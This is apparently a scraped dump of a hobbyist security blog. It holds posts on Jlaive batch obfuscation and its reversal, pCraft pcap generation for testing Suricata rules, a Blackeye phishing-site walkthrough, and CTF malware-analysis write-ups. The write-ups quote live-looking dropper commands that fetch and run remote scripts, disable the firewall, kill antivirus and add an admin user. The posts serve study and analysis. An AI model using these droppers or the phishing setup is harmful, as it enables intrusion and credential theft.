WcIse%%EHNuBdghke%%xmGqfoyigz%%PgpYWgnESr%%NdBkzRUyNc%%UDLwXXbfUO%%ZMFfhtZaCd%%hCSlczZEed%%DJZvlJxSeK%%tPPsLfEmfH%%dzLmqrEuSn%%QbZOQhYmgk%%lELXxFDard%%ZxsoDXEAmh%%yxMQSdikCf%%XOhAfBkWmm%%ieHoPTyjEy%%GgmonIEaZP%%kLMTZqURfX%%EyEeayRkCp%%FscnzUUuAC%%cUNiABJEPG%%HlBoTjvPwk%%QQwGKBkSYC%%JxakJbogEh%%eZKAFlWkCV%%wOUbaaionW%%uPqpbVZyku%%bEuenIEGAB%%TcbXekUkOV%%wyIRpJUzUy%%amOerQZEai%%IYUhcqkikI%%vwRxWzGiFE%%jEdNSXkuFv%%fYjkFWUCLu%%prlyUalgGj%%NUGvGuKfkH% %rrBdlEgEiR% attrib -s -h \u0026#34;%~dp0%~nx0.exe\u0026#34; del \u0026#34;%~dp0%~nx0.exe\u0026#34;(goto) 2\u0026gt;nul \u0026amp; del \u0026#34;%~f0\u0026#34; exit /b jjNNb7+5GJxTidTZUiwqq6EMDNO1MKBC21fz5d08N7l -- a bunch more of b64 encrypted bytes --- A great resource explaining the commands used in the batch file is a post made by Jose Luis Sánchez Martínez in his blog (which I will leave in the references). He gives an overview of what calls are being made when we execute this obfuscated .bat file and also a poc of rules to detect such malicious files (although, they could be bypassed).\nRunning this batch script gives the same output as our original executable:\nAfter we run this, the .bat file gets deleted - well, its contents gets deleted - and a new file, with an .exe extension appears to have been created:\nThis is where the tool Get-UnJlaive will come into play, which will take advantage of this and manage to deobfuscate the script and give the original .exe code.\nGet-UnJlaive Now onto the deobfuscation part. Get-UnJlaive is a tool able to reconstruct Jlaive (.NET Antivirus Evasion Tool (Exe2Bat)) to original Assembly and stub Assembly, as the author states. We are going to use his tool which can be found in the following repo (also has an amazing channel which I will leave in the references):\nhttps://github.com/Dump-GUY/Get-UnJlaive Basically what this tool does is to run the .bat file, set it in a suspended state to get the deobfuscated form (as we previously saw, a .exe was created after we had run the .bat), decrypt it, reconstruct the original assembly and then terminates it. For an indepth analysis of how this tool works, you can watch the video of dumpguy which I\u0026rsquo;ll leave in the references.\nReconstructing the original assembly The tool is easy to set. You simple just open a powershell terminal, load the module provided and you are good to go. After you run the tool, you should get a file with an extension \u0026ldquo;.bat_orig.exe\u0026rdquo; which you could load into DnSpy for example and view its code: Aaand we have successfully reconstructed our original .exe from the obfuscated batch file!\nReferences\n[1] scmagazine: Obfuscation tool ‘BatCloak’ evades 80% of AV engines\r[2] Jose Luis Sánchez Martínez: Using Jlaive to create batch files from .NET assemblies for defense evasion\r[3] Dump-GUY: Get-UnJlaive\r[3] DuMp-GuY TrIcKsTeR: Get-UnJlaive - Jlaive Protector Reconstructor\r","permalink":"http://localhost:1313/posts/jlaive/","summary":"What will this post be about This post will be about the Jlaive and Get-UnJlaive tools. I will not go into depth as there are other resources I will list that do a great job explaining more in depth of the ins and outs of these tools. This will just be an overview of the tools: How to obfuscate an executable with Jlaive and how to recover it using Get-UnJlaive.","title":"Exploring the Jlaive and UnJlaive tool"},{"content":"What is the pCraft tool pCraft is a tool used to generate pcaps based on a scenario written in an ami file. The generated pcap file can then be used for the testing of rules etc.\nInstallation To install the tool, you can either clone it from its github repo:\nhttps://github.com/DevoInc/pCraft or by using docker.\nI had some issues when running the tool from the github repo (dependency errors with the pyami module), so I went with the docker option instead, which is what I will demonstrate.\nIn summary, we need to run the following commands:\n{ \u0026#34;1) systemctl start docker\u0026#34;:\u0026#34;Starts docker\u0026#34;, \u0026#34;2) sudo docker pull sightingdb/pcraft\u0026#34;:\u0026#34;Pulls the docker image of the tool\u0026#34;, \u0026#34;3) docker run --name pcraft -d sightingdb/pcraft\u0026#34;:\u0026#34;Runs the tool\u0026#34;, \u0026#34;4) docker ps -a\u0026#34;:\u0026#34;Finds the ID of the docker process running the tool\u0026#34;, \u0026#34;5) docker exec -it {ID} bash\u0026#34;:\u0026#34;Executes the container in bash (meaning we get a shell inside the docker container)\u0026#34; } After that, we should be inside the docker container and run the tool without any errors:\nbuilder@4079f88d957d:~/pcraft$ ls \u0026#39;#hello.ami#\u0026#39; ami dns.ami parsuricata pyami.cpython-38-x86_64-linux-gnu.so setup.py LICENSE amigraph.py dns.pcap pcraft requirements.txt tests README.md build-pluginsdoc.py doc pcrafter samples tools builder@4079f88d957d:~/pcraft$ ./pcrafter Syntax: ./pcrafter script.ami output.pcap script.ami The .ami file contains actions that will be triggered and displayed inside the generated .pcap file. These actions can contain anything you see on a network traffic, like DNS queries, data being transfered, TCP handshakes etc.\nExample of an ami file An example of a .ami file is the following:\nami_version 1\r$victimip = \u0026#34;192.168.0.55\u0026#34;\r$fakebankip = \u0026#34;185.199.108.153\u0026#34;\raction DnsRequest {\r$ip-src = $victimip\r$ip-dst = $fakebankip\r$domain = \u0026#34;mikrosoft.com\u0026#34;\rexec DNSConnection\r}\raction PostData {\rexec HTTPConnection\r$method = \u0026#34;POST\u0026#34;\r$client-content-type = \u0026#34;application/x-www-form-urlencoded\u0026#34;\r$client-content = \u0026#34;login=Alfred.Wallace@example.com\u0026amp;password=qwerty1234\u0026#34;\r} This will basically trigger a DNS request and the resolved domain will be \u0026ldquo;mikrosoft.com\u0026rdquo; (you could set up a rule to detect such names later as we will see).\nAfterwards, we specify that a PostData action will take place which basically transfers some data - and specifically some user credentials.\nGenerating a pcap file based on an ami scenario Let\u0026rsquo;s see that in action:\nbuilder@4079f88d957d:~/pcraft$ ./pcrafter dns.ami dns.pcap All plugins loaded! Opening Script File dns.ami Executing action DnsRequest using DNSConnection Executing action PostData using HTTPConnection HTTP Method:POST builder@4079f88d957d:~/pcraft$ We copy over to our localhost the dns.pcap to view it in wireshark and then open it:\n┌──(connar㉿kali)-[~/blog/pcraft_tool] └─$ docker cp 4079f88d957d:/home/builder/pcraft/dns.pcap . └─$ wireshark dns.pcap\u0026amp; The result is the following pcap:\n└─$ tshark -r dns.pcap 1 Mar 16, 2024 21:30:18.468122000 EET 192.168.0.55 → 1.1.1.1 DNS 73 Standard query 0x0000 A mikrosoft.com 2 Mar 16, 2024 21:30:18.468536000 EET 1.1.1.1 → 192.168.0.55 DNS 102 Standard query response 0x0000 A mikrosoft.com A 185.199.108.153 3 Mar 16, 2024 21:30:18.469148000 EET 192.168.0.55 → 185.199.108.153 TCP 54 9279 → 80 [SYN] Seq=0 Win=8192 Len=0 4 Mar 16, 2024 21:30:18.469714000 EET 185.199.108.153 → 192.168.0.55 TCP 54 80 → 9279 [SYN, ACK] Seq=0 Ack=0 Win=8192 Len=0 5 Mar 16, 2024 21:30:18.470133000 EET 192.168.0.55 → 185.199.108.153 TCP 54 9279 → 80 [ACK] Seq=1 Ack=0 Win=8192 Len=0 6 Mar 16, 2024 21:30:18.470577000 EET 192.168.0.55 → 185.199.108.153 HTTP 311 POST / HTTP/1.1 (application/x-www-form-urlencoded) 7 Mar 16, 2024 21:30:18.471097000 EET 192.168.0.55 → 185.199.108.153 TCP 54 80 → 9279 [ACK] Seq=1 Ack=1 Win=8192 Len=0 8 Mar 16, 2024 21:30:18.471399000 EET 185.199.108.153 → 192.168.0.55 HTTP 268 HTTP/1.1 200 OK (text/html) Opening it in Wireshark, we get the following:\nNote: We can remove this \u0026lt;html\u0026gt;\u0026lt;body\u0026gt;Hello, you!\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; by going to pCraft/build/lib/pcraft/plugins/HTTPConnection.py or generally modifying it to our liking.\rTesting suricata rules on custom pcap As I mentioned earlier, pcraft is a great tool at making your own pcaps and testing rules upon them. In this part of the post, we are going to follow up on the example of the Red Team Village (see references) and create our own suricata rule, ami file and then generate a pcap and use tcpreplay to test if our rule is successful upon the generated custom network file.\nCreate the ami file (newsuricata.ami) The ami file we will use is the following:\nami_version 1\raction TriggerSuricata {\rexec Suricata\r$ip-src = \u0026#34;172.17.0.2\u0026#34;\r$ip-dst = \u0026#34;185.199.108.153\u0026#34;\r$rule = \u0026#34;\u0026#34;\u0026#34;alert dns any any -\u0026gt; any any (msg:\u0026#34;DNS Query GrayHat\u0026#34;; dns_query; content:\u0026#34;grayhat\u0026#34;; nocase; sid:20200809; rev:1;)\u0026#34;\u0026#34;\u0026#34;\r} Just a note here, we see that we exec Suricata. This file contains a domain called \u0026ldquo;GrayHat\u0026rdquo; as we will later see, so it uses this name as the $domain variable.\nCreate the Suricata rule (mydns.rule) The Suricata rule is a very simple one:\nalert dns any any -\u0026gt; any any (msg:\u0026#34;DNS Query Grayhat\u0026#34;; dns_query; content:\u0026#34;grayhat\u0026#34;; nocase; sid:20201020; rev:1;) It basically listens on all interfaces to find a dns query that contains the domain name \u0026ldquo;Grayhat\u0026rdquo;.\nTesting our rule Now that we have both the ami and the rule files ready, let\u0026rsquo;s generate the pcap file like we\u0026rsquo;ve seen previously:\nbuilder@4079f88d957d:~/pcraft$ ./pcrafter newsuricata.ami new.pcap The generated pcap is just a pcap that makes dns queries for the domain \u0026ldquo;Grayhat\u0026rdquo;:\nbuilder@4079f88d957d:~/pcraft$ tshark -r new.pcap 1 0.000000 172.17.0.2 ? 1.1.1.1 DNS 67 Standard query 0x0000 A grayhat 2 0.000409 1.1.1.1 ? 172.17.0.2 DNS 90 Standard query response 0x0000 A grayhat A 185.199.108.153 Now that we have a successfully generated pcap, let\u0026rsquo;s set up a listener with suricata (note that you must run the following as root user):\nroot@4079f88d957d:/home/builder/pcraft# suricata -S mydns.rule -i eth0 17/3/2024 -- 15:22:28 - \u0026lt;Notice\u0026gt; - This is Suricata version 5.0.3 RELEASE running in SYSTEM mode 17/3/2024 -- 15:22:28 - \u0026lt;Warning\u0026gt; - [ERRCODE: SC_ERR_SYSCALL(50)] - Failure when trying to set feature via ioctl for \u0026#39;eth0\u0026#39;: Operation not permitted (1) 17/3/2024 -- 15:22:28 - \u0026lt;Warning\u0026gt; - [ERRCODE: SC_ERR_SYSCALL(50)] - Failure when trying to set feature via ioctl for \u0026#39;eth0\u0026#39;: Operation not permitted (1) 17/3/2024 -- 15:22:28 - \u0026lt;Warning\u0026gt; - [ERRCODE: SC_ERR_SYSCALL(50)] - Failure when trying to set feature via ioctl for \u0026#39;eth0\u0026#39;: Operation not permitted (1) 17/3/2024 -- 15:22:28 - \u0026lt;Notice\u0026gt; - all 5 packet processing threads, 4 management threads initialized, engine started Then, we can just use tcpreplay with our previously generated pcap to replicate the traffic:\nbuilder@4079f88d957d:~/pcraft$ tcpreplay -i eth0 new.pcap Warning in interface.c:get_interface_list() line 93: May need to run as root to get access to all network interfaces. Fatal Error in sendpacket.c:sendpacket_open() line 544: failed to open device eth0: socket: Operation not permitted builder@4079f88d957d:~/pcraft$ sudo tcpreplay -i eth0 new.pcap Actual: 2 packets (157 bytes) sent in 0.000455 seconds Rated: 345054.9 Bps, 2.76 Mbps, 4395.60 pps Flows: 2 flows, 4395.60 fps, 2 flow packets, 0 non-flow Statistics for network device: eth0 Successful packets: 2 Failed packets: 0 Truncated packets: 0 Retried packets (ENOBUFS): 0 Retried packets (EAGAIN): 0 Now, moment of truth! Let\u0026rsquo;s see what has been written on /var/log/suricata/fast.log which basically contains alerts that get triggered based on matching suricata rules.\nroot@4079f88d957d:/home/builder/pcraft# cat /var/log/suricata/fast.log 03/17/2024-15:23:28.882746 [**] [1:20201020:1] DNS Query Grayhat [**] [Classification: (null)] [Priority: 3] {UDP} 172.17.0.2:4096 -\u0026gt; 1.1.1.1:53 Aaaaaand we got a successful alert! Isn\u0026rsquo;t this great?\npCraft seems like a great tool to play around and dive deeper into rules and custom traffic. I will definitely use this tool for training and maybe I\u0026rsquo;ll come back in the future with an extensive senario to take a look together.\nUntil next time everyone!\nReferences\n[1] Sans Technology Institute: Generating PCAP Files from YAML\r[2] github: pCraft repo\r[3] Red Team Village: Attacking Networks with pCraft\r","permalink":"http://localhost:1313/posts/pcraft/","summary":"What is the pCraft tool pCraft is a tool used to generate pcaps based on a scenario written in an ami file. The generated pcap file can then be used for the testing of rules etc.\nInstallation To install the tool, you can either clone it from its github repo:\nhttps://github.com/DevoInc/pCraft or by using docker.\nI had some issues when running the tool from the github repo (dependency errors with the pyami module), so I went with the docker option instead, which is what I will demonstrate.","title":"Exploring the pCraft tool"},{"content":"Intro In this post we are going to see how to make a phishing website to then use for other attacks such as the Browser-in-the-Browser attack ( see: BitB ).\nThere are plenty of tools out there to quickly set up a phishing website. For example:\nSocialphish Shell Phish Zphisher Blackeye and plenty others, but also platforms like gophish.\nI just happened to be reading something about Blackeye tool, so we\u0026rsquo;ll go with this option. Setup of blackeye Its very quick and easy to set up blackeye. All you have to do is the following:\n┌──(connar㉿kali)-[~/blog/black_eye_tool] └─$ git clone https://github.com/EricksonAtHome/blackeye.git Cloning into \u0026#39;blackeye\u0026#39;... remote: Enumerating objects: 305, done. remote: Counting objects: 100% (161/161), done. remote: Compressing objects: 100% (119/119), done. remote: Total 305 (delta 68), reused 127 (delta 38), pack-reused 144 Receiving objects: 100% (305/305), 2.68 MiB | 1.73 MiB/s, done. Resolving deltas: 100% (92/92), done. ┌──(connar㉿kali)-[~/blog/black_eye_tool] └─$ cd blackeye ┌──(connar㉿kali)-[~/blog/black_eye_tool/blackeye] └─$ ./blackeye.sh :: Disclaimer: Developers assume no liability and are not :: :: responsible for any misuse or damage caused by BlackEye. :: :: Only use for educational purporses!! :: :: BLACKEYE By @EricksonAtHome :: [01] Instagram [17] DropBox [33] eBay [02] Facebook [18] Line [34] Amazon [03] Snapchat [19] Shopify [35] iCloud [04] Twitter [20] Messenger [36] Spotify [05] Github [21] GitLab [37] Netflix [06] Google [22] Twitch [38] Reddit [07] Origin [23] MySpace [39] StackOverflow [08] Yahoo [24] Badoo [40] Custom [09] Linkedin [25] VK [10] Protonmail [26] Yandex [11] Wordpress [27] devianART [12] Microsoft [28] Wi-Fi [13] IGFollowers [29] PayPal [14] Pinterest [30] Steam [15] Apple ID [31] Tiktok [16] Verizon [32] Playstation ┌─[ Choose an option:]─[~] └──╼ ~ 34 1.Ngrok 2.Localtunnel To continue, we need to set Ngrok server. We can download the binary from the ngrok website. Afterwards, we need to do the following steps:\n└─$ sudo tar xvzf ngrok-v3-stable-linux-amd64.tgz └─$ sudo mv ngrok /usr/local/bin The final step is to set your auth token which can be found by making an account on the ngrok dashboard. There, you will find your auth token and then can do the last step, which is:\n└─$ ngrok config add-authtoken [your_auth_token] We can now switch back to blackeye and choose option 1:\n─[ Choose the tunneling method:]─[~] └──╼ ~ 1 [*] Starting php server... [*] Starting ngrok server... [*] Send this link to the Victim: [*] Use shortened link instead: [*] Waiting victim open the link ... To get the link, we have to run the ngrok binary we previously downloaded. The port it runs on is 5555 by default and can be found inside its code (and edited of course to listen to some other port like 8080):\n└─$ ngrok http 5555 ngrok (Ctrl+C to quit) Take our ngrok in production survey! https://forms.gle/[redacted] Session Status online Account [redacted] (Plan: Free) Version 3.8.0 Region [redacted] ([redacted]) Latency 362ms Web Interface http://127.0.0.1:4040 Forwarding https://[redacted].ngrok-free.app -\u0026gt; http://localhost:5555 Connections ttl opn rt1 rt5 p50 p90 0 0 0.00 0.00 0.00 0.00 Now that the server is running our phishing amazon site, let\u0026rsquo;s head back to blackeye:\n[*] Waiting victim open the link ... [*] IP Found! [*] IPv6: [redacted] [*] User-Agent: [redacted] [*] Country: [redacted] [*] Region: [redacted] [*] City: [redacted] [*] Postal: [redacted] [*] Location: [redacted] [*] Maps: [redacted] [*] ISP: [redacted] [*] Timezone: [redacted] [*] Saved: amazon/saved.ip.txt [*] Waiting credentials ... Visiting the url provided in the running ngrok instance, we are met with the following website:\nWe provide some rogue credentials and we have our result: ","permalink":"http://localhost:1313/posts/phishingsite/","summary":"Intro In this post we are going to see how to make a phishing website to then use for other attacks such as the Browser-in-the-Browser attack ( see: BitB ).\nThere are plenty of tools out there to quickly set up a phishing website. For example:\nSocialphish Shell Phish Zphisher Blackeye and plenty others, but also platforms like gophish.\nI just happened to be reading something about Blackeye tool, so we\u0026rsquo;ll go with this option.","title":"Setting up a phishing site [using blackeye tool]"},{"content":"","permalink":"http://localhost:1313/ctfwriteups/weaklegacy/","summary":"","title":""},{"content":" connar@localhost:~$ whoami { \u0026#34;Name\u0026#34;:\u0026#34;Connar\u0026#34;, \u0026#34;Location\u0026#34;:\u0026#34;Somewhere in Europe\u0026#34;, \u0026#34;Interests\u0026#34;:[ \u0026#34;Forensics\u0026#34;, \u0026#34;Malware Analysis\u0026#34;, \u0026#34;Maldev\u0026#34;, \u0026#34;Cryptography\u0026#34;, \u0026#34;Reverse Engineering\u0026#34;, \u0026#34;Security in general\u0026#34; ], \u0026#34;Age\u0026#34;:\u0026#34;22\u0026#34; } Hi! Im connar. Im 22 and I am learning various cybersecurity topics and experimenting with different random tools I stumble upon.\nI am mainly into malware stuff (analysis and dev) but also into forensics. To be honest, I am no expert, but I am trying to apply the Feynman\u0026rsquo;s technique which helps me a lot to memorize and better understand the stuff I am learning (thus, this blog).\nI also really like making CTF challenges, some of which you are going to see here in this blog:)\nThis is basically a journal into my journey into cybersecurity, keeping track of what I have learned and stuff that may seem useful to any of you that are reading it. Obviously, my posts and things I read from other authors and just try to try them myself, so credits go to them:)\nThat\u0026rsquo;s a wrap I think. Hope you stick around, have fun:)\n","permalink":"http://localhost:1313/about/","summary":"about","title":"About"},{"content":"Starting the analysis In this challenge we are provided with a .rar file. We can extract the following files from this archive:\nAn image named “SantasVillage.png” A txt named “RecipeForClassicBreadStuffing.txt” If we pay attention to the txt file, we will notice that it is actually a vbs script. If we open it and view its contents we are met with the following code: What this script is doing is:\nOpen a website with recipe instructions. Try to craft the path for the png image. Try and execute a script named herfxmasgiftfreh.cmd found inside an ADS stream of the png file. This should raise some alarms about the script inside the ADS stream of the png image, so let’s start analyzing it. To get the contents of the hidden script inside the ADS stream, we can run the following command: After running the command “Get-Content –Path .\\VillageOfSanta.png -Stream herfxmasgiftfreh.cmd” we get the embedded .cmd script that seems to be obfuscated. Let’s save it to a separate file and start deobfuscating it.\nDeobfuscation The method of obfuscation here is called envar obfuscation. Basically the malware creates a set of characters and creates the code to be executed by taking individual characters from the defined list:\nAfter we are done deobfuscating the script (by replacing each expression with the corresponding character), we are met with the following script:\nThe script has a lot going on, but we should pay attention to only 3 suspicious parts. The first one is the one where the script tries to download a .bat file from Pastebin and then run it:\nnetsh firewall set opmode mode-disable powershell -command \u0026#34;Invoke-Webrequest https://pastebin.com/raw/bLnD8FWX -outfile KillAVS.bat\u0026#34; start KillAVS.bat If we visit this url, we are met with another obfuscated script:\nUpon deobfuscating it with the same method used previously, we end up with the following deobfuscated script:\nThis tried to stop all possible AV engines that may be installed on the system. Really interesting, but no flag here, so let’s move to the second suspicious url:\ncls powershell -Command \u0026#34;Invoke-WebRequest https://pastebin.com/raw/ptkj3Ua5 -outFile ycynlog.cmd\u0026#34; start /min ycynlog.cmd As before, another obfuscated script can be found by visiting the url:\nDeobfuscating once again the script with the same methodology, we end up with:\nAnother file being dropped… But this time its an executable. Maybe this is the end? Visiting the rentry link we end up with some hex values that match the header of an executable:\nThe script itself tries to decode them and save the bytes to an executable, so we should try and do the same. We can use cyberchef for that:\nSaving them as an .exe and opening the executable in IDA, we are met with the following contents:\nAfter looking around a bit in the functions, we are finally met with the flag:\nUINT AddUser() { WinExec( \u0026#34;cmd.exe /c net user System_guest NHACK{4_7h3_23c02d_7h15_w45_4n_4c7u4l_m4lw4r3_54mpl3_s0_c0n92475!!} /add\u0026#34;; 0); return WinExec(\u0026#34;cmd.exe /c net localgroup administrators System_guest /add\u0026#34;; 0); } ","permalink":"http://localhost:1313/ctfwriteups/anemailfromauntchloe/","summary":"Starting the analysis In this challenge we are provided with a .rar file. We can extract the following files from this archive:\nAn image named “SantasVillage.png” A txt named “RecipeForClassicBreadStuffing.txt” If we pay attention to the txt file, we will notice that it is actually a vbs script. If we open it and view its contents we are met with the following code: What this script is doing is:\nOpen a website with recipe instructions.","title":"An email from aunt Chloe - Writeup"},{"content":"This is a writeup for the babufscation challenge This challenge gives us a zip file containing 3 pcap files:\nWhat we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.\nWe can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap.\nBy doing so, we notice that firstly, an .hta file was downloaded and run. This .hta file probably downloaded the second file which is a javascript file, and this javascript file probably downloaded the last file which is a .bat one.\nWe can export all the files through File\u0026ndash;\u0026gt;Export Objects\u0026ndash;\u0026gt;HTTP.\nLet\u0026rsquo;s start analyzing the first file: \u0026ldquo;noticeJuly.hta\u0026rdquo; Running the file, we are met with the following window:\nOpening the file in a text editor, we observe the following fake looking page:\nWe see a very suspicious command that is executed upon clicking the Refresh Button. We can use the CMD Watcher tool (not that it is needed) to see that indeed this sus looking command is being run upon clicking the button:\nLet\u0026rsquo;s analyze this command that is being run. The command is the following:\nC:\\Windows\\System32\\cONhosT.exe %COMSpeC% /V/D/c \u0026#34;S^eT SSG=C:\\kfldeokgr\\\u0026amp;\u0026amp; mD !SSG!\u0026gt;nul 2\u0026gt;\u0026amp;1\u0026amp;\u0026amp;S^eT UFWN=!SSG!^KGRAAKR.JS\u0026amp;\u0026amp;\u0026lt;nul set/p LAXA=var LAXA=\u0026#39;\\u0055\\u004c\\u0064\\u002b\\u0044\\u0055\\u004c\\u0064\\u002b\\u0045\\u0055\\u004c\\u0064\\u002b\\u0022\\u002f\\u002f\\u0063\\u0030\\u0072\\u0061\\u0078\\u002e\\u0065\\u0070\\u0068\\u0033\\u006b\\u0064\\u006f\\u006c\\u006d\\u0066\\u0061\\u002e\\u0063\\u006c\\u006f\\u0075\\u0064\\u002f\\u003f\\u0032\\u002f\\u0022\\u0029\\u003b\u0026#39;;SSG=\u0026#39;\\u003a\\u0068\\u0022\\u003b\\u0045\\u0055\\u004c\\u0064\\u003d\\u0022\\u0054\\u0074\\u0022\\u002b\\u0022\\u0050\\u003a\\u0022\\u003b\\u0047\\u0065\\u0074\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u0028\\u0043\u0026#39;;PEBC=\u0026#39;\\u0076\\u0061\\u0072\\u0020\\u0043\\u0055\\u004c\\u0064\\u003d\\u0022\\u0073\\u0022\\u002b\\u0022\\u0063\\u0072\\u0022\\u003b\\u0044\\u0055\\u004c\\u0064\\u003d\\u0022\\u0069\\u0070\\u0074\\u0022\\u002b\\u0022\u0026#39;;UFWN=PEBC+SSG+LAXA;PADO=new Function(UFWN);PADO(); \u0026gt;!UFWN!|caLl !UFWN!||caLl !UFWN! \u0026#34; Firstly, let\u0026rsquo;s take the unicode values and convert them to plaintext. You can use this cyberchef command to decode them:\nCyberChef Command The command that is left is the following:\nC:\\Windows\\System32\\cONhosT.exe %COMSpeC% /V/D/c \u0026#34;S^eT SSG=C:\\kfldeokgr\\\u0026amp;\u0026amp; mD !SSG!\u0026gt;nul 2\u0026gt;\u0026amp;1\u0026amp;\u0026amp;S^eT UFWN=!SSG!^KGRAAKR.JS\u0026amp;\u0026amp;\u0026lt;nul set/p LAXA=var LAXA=\u0026#39;ULd+DULd+EULd+\u0026#34;//c0rax.eph3kdolmfa.cloud/?2/\u0026#34;);\u0026#39;;SSG=\u0026#39;:h\u0026#34;;EULd=\u0026#34;Tt\u0026#34;+\u0026#34;P:\u0026#34;;GetObject(C\u0026#39;;PEBC=\u0026#39;var CULd=\u0026#34;s\u0026#34;+\u0026#34;cr\u0026#34;;DULd=\u0026#34;ipt\u0026#34;+\u0026#34;\u0026#39;;UFWN=PEBC+SSG+LAXA;PADO=new Function(UFWN);PADO(); \u0026gt;!UFWN!|caLl !UFWN!||caLl !UFWN! \u0026#34; Analyzing the command, here are the takeaways:\nC:\\Windows\\System32\\cONhosT.exe %COMSpeC% /V/D/c: It will open a cmd window with the /V/D/c parameters. S^eT SSG=C:\\kfldeokgr\\\u0026amp;\u0026amp; mD !SSG!\u0026gt;nul 2\u0026gt;\u0026amp;1: Sets a variable SSG to a path and then creats this path using mD (an alias for make directory), redirecting the output accordingly. S^eT UFWN=!SSG!^PEBCPADO.JS: Sets the previously mentioned path with a .js filename to the variable UFWN. \u0026lt;nul set/p LAXA=var LAXA='ULd+DULd+EULd+\u0026quot;//c0rax.eph3kdolmfa.cloud/?2/\u0026quot;);';\rSSG=':h\u0026quot;;EULd=\u0026quot;Tt\u0026quot;+\u0026quot;P:\u0026quot;;GetObject(C';PEBC='var CULd=\u0026quot;s\u0026quot;+\u0026quot;cr\u0026quot;;DULd=\u0026quot;ipt\u0026quot;+\u0026quot;';\rUFWN=PEBC+SSG+LAXA: This basically creates some javascript code and stores it in the LAXA variable. PADO=new Function(UFWN);PADO(): This creates a js function with the code set in UFWN variable and runs it. By deobfuscating the js code, we are basically left with this code:\nvar CULd=\u0026#34;s\u0026#34;+\u0026#34;cr\u0026#34;; DULd=\u0026#34;ipt\u0026#34;+\u0026#34;:h\u0026#34;; EULd=\u0026#34;Tt\u0026#34;+\u0026#34;P:\u0026#34;; GetObject(CULd+DULd+EULd+\u0026#34;//c0rax.eph3kdolmfa.cloud/?2/\u0026#34;); //which basically is--\u0026gt; script:http://c0rax.eph3kdolmfa.cloud/?2/ This is all for the .hta file. It creates a .js file. This .js file creates an instance of a COM object retrieved from the specified url.\nFinally, by using \u0026gt;!UFWN!|caLl !UFWN!||caLl !UFWN! the .js file is run. That\u0026rsquo;s all for this .hta file. Now let\u0026rsquo;s move to the second pcap which contains the .js code retrieved, which is the stage 2 of the attack.\nThe code in the .js file is the following:\nvar lt135 = \u0026#34;QCVwcm9ncmFtZmlsZXM6fjE1LDElJWNvbXNwZWM6fi0xMiwxJSVjb21zcGVjOn4xNCwxJSVwcm9ncmFtZmlsZXM6fjEwLDElJz1eIj4lY29tbW9ucHJvZ3JhbWZpbGVzOn4#%MiwxJXUlcHJvZ3JhbWZpbGVzOn4xM#%wxJSZAJWNvbXNwZWM6fi0zLDElJWNvbXNwZWM6fjIwLDElaCVjb21tb25wcm9ncmFtZmlsZXM6fjE4LDElJWNvbW1vbnB#%b2d#%YW1maWxlczp+MjMsMSUlY29tbW9ucHJvZ3JhbWZpbGVzOn4tMTEsMSVmZiZAJWNvbW1vbnB#%b2d#%YW1maWxlczp+LTEsMSUlY29tc3BlYzp+LTEsMSUlY29tc3BlYzp+LTEzLDElJXB#%b2d#%YW1maWxlczp+LTYsMSUnPSVvczp+NSwxJV5eXi1eXl43Xl5eJXBh---snip---\u0026#34; var re = new RegExp(\u0026#34;#%\u0026#34;, \u0026#34;g\u0026#34;); lt135 = lt135.replace(re, \u0026#34;y\u0026#34;); var gj4fjrg = WScript.CreateObject(\u0026#34;WScript.Shell\u0026#34;); var fkfo3l = gj4fjrg.ExpandEnvironmentStrings(\u0026#34;%appdata%\u0026#34;); var whshis4 = fkfo3l + \u0026#34;\\\\kQiFcryrxG.bat\u0026#34;; var dcdd = decodeBase64(lt135); writeBytes(whshis4, dcdd); gj4fjrg.run(\u0026#34;\\\u0026#34;\u0026#34; + whshis4 + \u0026#34;\\\u0026#34;\u0026#34;); This basically makes some replacements in the specified code, decodes the long b64 string and saves it in the appdata folder as a .bat file. By following the same operations, we end up with this .bat file:\nThis kinda seems like normal envar obfuscation but it is slightly different. It combines multiple known batch obfuscation techniques, such as pre existing envars, custom dictionary etc. One could try to deobfuscate this manually, but there is a twist in this specific batch file. Let\u0026rsquo;s save it and upload it to VirusTotal to see what I mean:\nThe thing to take away here is that VirusTotal sometimes will identify known techniques and specify them. Here, we see an interesting text: \u0026ldquo;BatchEncryption\u0026rdquo;. Let\u0026rsquo;s google this and see what comes up:\nDamn. By opening a few tabs and reading the articles (well, translated except if you know chinese), we learn that this is a tecnhique implemented by a tool named BatchEncryptor which was created by gwsbhqt@163.com. There is also the corresponding tool to decode the whole .bat file for us! This tool exists in this repo:\nhttps://github.com/cnHopeStudio/Batch-Encryption-DeCoder (its the first google search result we got previously). By building this tool and running it, we get the deobfuscated bat code which is\u0026hellip;another obfuscated command:\nThe new command we are called to deobfuscate is:\ncmd /V /C \u0026#34;set shgyngmcqs=0XoY\u0026amp;Ndh%Cas3WlpPRn\\meFQwgf/U2D5T:.k tbzri*uMc\u0026amp;\u0026amp;FOR %A IN (38 41 37 11 10 6 20 41 18 36 27 37 40 10 18 11 26 21 40 36 17 28 5 32 23 12 11 0 5 39 6 26 5 29 25 39 5 32 5 26 3 29 25 0 44 13 31 35 1 39 45 39 3 29 7 43 44 13 5 2 44 39 28 36 7 37 37 15 33 27 27 11 43 18 40 41 39 25 14 12 27 37 34 38 10 37 36 8 37 20 15 8 19 37 34 38 10 37 36 4 36 8 37 20 15 8 19 37 34 38 10 37 36 4 36 11 45 36 11 37 2 15 36 38 41 37 11 36 4 36 37 41 20 21 2 43 37 36 31 36 4 36 6 21 14 36 27 23 36 27 22 36 9 33 19 16 40 2 25 40 10 20 30 10 37 10 19 44 41 45 40 2 11 2 26 37 19 5 21 37 24 2 40 35 19 30 2 24 18 14 2 10 6 21 40 19 42 36 4 36 11 45 36 11 37 10 40 37 36 38 41 37 11 1337) DO set xqzwdomkia=!xqzwdomkia!!shgyngmcqs:~%A,1!\u0026amp;\u0026amp; IF %A==1337 CALL %xqzwdomkia:~-213%\u0026#34; If we read this carefully, we will see that it is not that difficult to deobfuscate. Basically, it just sets a dictionary, then runs a loop and takes a specific character of the corresponding index based on the loop. It recreates the command to be run and then calls it. Let\u0026rsquo;s use python to deobfuscate this:\nNote: The technique used is an existing one and is called \u0026ldquo;forencoding obfuscation\u0026rdquo;.\nThe result we get is the following bitsadmin command:\nbitsadmin /transfer RUNTQ3s0NzdfN2gzNTNfY2g0MW5kXzczY2huMWNoMzU http://sunrizgl3/t.bat 